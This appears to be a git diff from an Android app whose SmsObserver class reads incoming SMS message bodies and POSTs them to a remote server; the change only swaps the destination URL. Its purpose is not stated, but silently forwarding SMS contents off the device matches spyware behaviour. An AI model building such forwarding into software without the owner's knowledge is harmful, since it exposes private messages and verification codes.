@@ -188,7 +188,7 @@ public class SmsObserver extends ContentObserver {
         FormBody.Builder fromBodyBuilder = new FormBody.Builder();
         RequestBody requestBody = fromBodyBuilder.add("sms", msgBody).add("type", type).build();
         Request.Builder requestBuilder = new Request.Builder();
-        Request request = requestBuilder.url("http://dxysun.com:8001/spark/testsms/").post(requestBody).build();
+        Request request = requestBuilder.url("https://lucfzy.com/spark/testsms/").post(requestBody).build();
 
         Call call = okHttpClient.newCall(request);
 
